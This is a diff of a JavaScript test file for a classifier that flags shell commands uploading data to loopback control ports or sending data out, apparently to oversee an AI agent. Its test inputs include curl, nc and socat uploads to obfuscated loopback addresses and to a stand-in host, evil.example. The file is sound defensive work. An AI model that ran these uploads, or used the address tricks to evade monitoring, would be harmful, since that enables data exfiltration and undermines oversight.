@@ -50,9 +50,9 @@ test("moorai-control is never aligned, whatever the task names", () => {
   assert.deepEqual([r.class, r.aligned], ["moorai-control", false]);
 });
 
-test("a loopback upload to any other port, and a GET to a MoorAI port, are still not risky", () => {
-  assert.equal(bash("curl -d @p.json http://localhost:3000/api"), null);
-  assert.equal(bash("curl -d @p.json localhost:3000/api"), null);
+test("a loopback upload to any other port is judged too (moorai-control); a GET to a MoorAI port is not risky", () => {
+  assert.equal(bash("curl -d @p.json http://localhost:3000/api").cls, "moorai-control");
+  assert.equal(bash("curl -d @p.json localhost:3000/api").cls, "moorai-control");
   assert.equal(bash("curl -s http://127.0.0.1:8790/healthz"), null);
 });
 
@@ -126,10 +126,10 @@ test("R3: every spelling of a loopback address on a MoorAI port is moorai-contro
   assert.equal(bash("nc 0x7f.1 8790 < r").cls, "moorai-control");
   assert.equal(bash("nc -w 3 2130706433 8848 < r").cls, "moorai-control");
   assert.equal(bash("socat - tcp:[::ffff:127.0.0.1]:8791").cls, "moorai-control");
-  // Not loopback: a public address spelled as a number is egress; loopback on another port is not risky.
+  // Not loopback: a public address spelled as a number is egress; loopback on another port is judged too.
   assert.equal(bash("curl -d @t http://3232235777:8790/x").cls, "egress");
-  assert.equal(bash("curl -d @t http://0x7f.1:3000/x"), null);
-  assert.equal(bash("curl -d @t 'http://[::ffff:127.0.0.1]:3000/x'"), null);
+  assert.equal(bash("curl -d @t http://0x7f.1:3000/x").cls, "moorai-control");
+  assert.equal(bash("curl -d @t 'http://[::ffff:127.0.0.1]:3000/x'").cls, "moorai-control");
 });
 
 test("R3: the address normalisation is bounded and linear", () => {
@@ -146,12 +146,40 @@ test("R6: a MoorAI port with leading zeros is still a MoorAI port; an authority 
     const t = bash(cmd);
     assert.equal(t && t.cls, "moorai-control", cmd);
   }
-  assert.equal(bash("curl -d @t http://127.0.0.1:00003000/x"), null, "a padded other port is still another port");
-  const long = bash("curl -d @t http://127.0.0.1:0000000000000000099999/x");
-  assert.notEqual(long && long.cls, "moorai-control", "past 16 digits is no port of ours");
-  assert.ok(long && long.sites.includes("unknown"), "an unreadable authority fails closed");
+  assert.deepEqual(bash("curl -d @t http://127.0.0.1:00003000/x").sites, ["loopback:3000"], "a padded other port is judged, named as itself");
+  assert.deepEqual(bash("curl -d @t http://127.0.0.1:0000000000000000099999/x").sites, ["loopback"], "an unreadable loopback port is still judged");
   for (const cmd of ["curl -d @f my_host.example/x", "curl -d @f evil.example:99999999999999999999/x", "curl -d @f 'a b'"]) {
     const t = bash(cmd);
     assert.ok(t && t.sites.includes("unknown"), `${cmd}: ${JSON.stringify(t)}`);
   }
+});
+
+// ---- commit review (checkpoint 5ff0723): every loopback upload is judged, whatever the port ----
+
+test("R7: an upload to ANY loopback host is moorai-control, the port readable or not, MoorAI's or not", () => {
+  for (const cmd of [
+    "curl -d x http://127.0.0.1:000000000000000000008790/v1/task",
+    "curl -d x http://localhost:5432",
+    "curl -d @p.json http://localhost:3000/api",
+    "curl -d x 127.0.0.1:000000000000000000008790/v1/task",
+    "curl -d x localhost",
+    "curl -d x 'http://[::1]:99999999999999999999/x'",
+    "nc 127.0.0.1 000000000000000000008790 < r",
+    "nc localhost 5432 < q",
+    "nc localhost \"$PORT\" < q",
+    "ncat localhost http < q",
+    "socat - tcp:127.0.0.1:000000000000000000008791",
+    "wget --post-data=x http://0x7f.1:8080/"
+  ]) {
+    const t = bash(cmd);
+    assert.equal(t && t.cls, "moorai-control", cmd);
+  }
+  // A readable MoorAI port is named in the target detail; the decision does not depend on it.
+  assert.deepEqual(bash("curl -d x http://127.0.0.1:0008790/v1/task").sites, ["loopback:8790"]);
+  assert.deepEqual(bash("curl -d x http://localhost:5432").sites, ["loopback:5432"]);
+  assert.deepEqual(bash("curl -d x http://127.0.0.1:000000000000000000008790/").sites, ["loopback:8790"], "leading zeros of any length are dropped for the detail");
+  assert.deepEqual(bash("curl -d x 'http://[::1]:99999999999999999999/'").sites, ["loopback"], "an unreadable port: judged, no port in the detail");
+  // Still not judged: a GET (no upload), and WSL's file share.
+  assert.equal(bash("curl -s http://localhost:3000/health"), null);
+  assert.equal(bash("copy notes.txt \\\\wsl.localhost\\Ubuntu\\home\\me\\"), null);
 });
